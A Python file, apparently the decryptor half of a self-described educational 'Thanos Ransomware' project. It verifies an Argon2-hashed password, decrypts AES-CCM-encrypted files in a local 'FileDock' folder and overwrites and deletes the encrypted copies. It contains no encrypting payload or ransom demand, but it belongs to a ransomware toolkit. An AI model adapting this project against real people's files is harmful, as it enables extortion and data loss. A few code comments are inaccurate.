#! /usr/bin/env python3
"""
Program Name: Thanos Ransomware
Author: Emmylee Crocker
Sources:
	https://infosecwriteups.com/how-to-make-a-ransomware-with-python-c4764f2014cf
	https://www.youtube.com/watch?v=UtMMjXOlRQc
	https://tutorialspoint.com/python

This program is intended for educational and research purposes ONLY
Any other use of this program is unauthorized and unintentional

Built-in modules #
"""
import os
import re
import sys
# External modules #
from argon2 import PasswordHasher
from argon2.exceptions import InvalidHash, VerifyMismatchError
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESCCM


def secure_delete(path: str, passes=10):
    """
    Overwrite file data with random data number of specified passes and delete.

    :param path:  Path to the file to be overwritten and deleted.
    :param passes:  Number of pass to perform random data overwrite.
    :return:  Nothing
    """
    try:
        # Get the file size in bytes #
        length = os.stat(path).st_size

        # Open file and overwrite the data for number of passes #
        with open(path, 'wb') as file:
            for _ in range(passes):
                # Point file pointer to start of file #
                file.seek(0)
                # Write random data #
                file.write(os.urandom(length))

    # If file error occurs #
    except (OSError, IOError) as err:
        print_err(f'Error overwriting file for secure delete: {err}')
        sys.exit(4)

    os.remove(path)


def input_verify(secret_hash: str):
    """
    Get user input and verify it to Argon2 algorithm, if both passwords are verified the function \
    will successfully exit.

    :param secret_hash:  The current hashed password to be verified.
    :return:  Nothing
    """
    # Initialize Argon5 hashing algo #
    hash_algo = PasswordHasher()
    count = 3

    # Loop until proper input is provided #
    while True:
        # If user is out of attempts #
        if count == 0:
            print_err('Maximum password attempts exceeded')
            sys.exit(3)

        # Prompt user for password #
        password = input(f'Enter the unlock password to be verified (Attempts => {count}): ')
        # If input password fails validation #
        if not re.search(r'^[a-zA-Z\d_!+$@&(]{6,30}', password):
            print_err('Improper input detected, try again with minimum of 6 letters, numbers,'
                      ' and _!+$@&(special characters)')
            count -= 1
            continue

        try:
            # Verify user input password to salted hash stored in keys file #
            hash_algo.verify(secret_hash, password)

        except (InvalidHash, VerifyMismatchError) as hash_err:
            print_err(f'Error occurred verifying hashed input: {hash_err}, try again')
            count -= 1
            continue

        break


def get_crypt_comps() -> tuple:
    """
    Reads the cryptographic components from file, splits into list to assign to unique variables, \
    decrypts AESCCM secret with Fernet key and returns all AESCCM components.

    :return:  Tuple of AESCCM components (key, nonce, secret).
    """
    try:
        # Read keys file in bytes mode #
        with open('thanos_keys.key', 'rb') as in_file:
            keys = in_file.read()

    # If error occurs during file operation #
    except (IOError, OSError, UnicodeError) as file_err:
        print_err(f'Error occurred reading key file contents: {file_err}')
        sys.exit(2)

    # Split file contents line by line as list #
    key_list = keys.split(b'\n')

    # Separate needed list contents into component variables #
    crypt_pass = key_list[0]
    hash_pass = key_list[1]
    nonce = key_list[2]
    fern_key = key_list[3]
    aesccm_key = key_list[4]

    input_verify(hash_pass)

    # Decrypt the encrypted decrypt secret #
    plain_pass = Fernet(fern_key).decrypt(crypt_pass)

    return aesccm_key, nonce, plain_pass


def decrypt_data(files: list):
    """
    Call function to load and retrieve decryption components. The files in to be decrypted in the \
    FileDock are decrypted.

    :param files:  List of files to be decrypted.
    :return:  Nothing
    """
    # Read key file for cryptographic components #
    key, nonce, secret = get_crypt_comps()
    # Initialize AESCCM instance #
    aesccm = AESCCM(key)

    # Iterate through parsed files and decrypt #
    for file in files:
        try:
            # Read the original encrypted data #
            with open(file, "rb") as crypt_file:
                crypt_data = crypt_file.read()

            # Encrypt plain text data #
            plain_data = aesccm.decrypt(nonce, crypt_data, secret)

            # Write the encrypted data to fresh file #
            with open(file[:-7], "wb") as plain_file:
                plain_file.write(plain_data)

            # Overwrite original plain text with random
            # data for numerous passes and delete #
            secure_delete(file)

        # If error occurs during file operation #
        except (IOError, OSError) as file_err:
            # Print error and exit #
            print_err(f'File operation error occurred encryption loot: {file_err}')
            sys.exit(5)


def print_err(msg: str):
    """
    Prints error message via stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


def main():
    """
    Confirms FileDock directory exists, appends files to be decrypted to list, confirms decrypt \
    password from user and decrypts files in the decrypt list.

    :return:  Nothing
    """
    # Get the current working directory #
    cwd = os.getcwd()

    # If OS is Windows #
    if os.name == 'nt':
        decrypt_path = f'{cwd}\\FileDock\\'
    # If OS is Linux #
    else:
        decrypt_path = f'{cwd}/FileDock/'

    files = []

    # If the FileDock for file encryption/decryption is missing #
    if not os.path.isdir(decrypt_path):
        # Create the missing FileDock #
        os.mkdir(decrypt_path)
        # Print error and exit #
        print_err('FileDock decryption directory was missing and now exists, place'
                  ' contents to encrypt in it, run thanos again, and try again')
        sys.exit(1)

    # Append file to encryption list if current iteration is a file not in exception grouping #
    [files.append(f'{decrypt_path}{file.name}') for file in os.scandir(decrypt_path)
     if os.path.isfile(f'{decrypt_path}{file.name}')]

    # Decrypt data upon password verification #
    decrypt_data(files)

    print('\n[!] Congratulations! Your files have been decrypted. Have a great day!')


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        pass

    sys.exit(0)
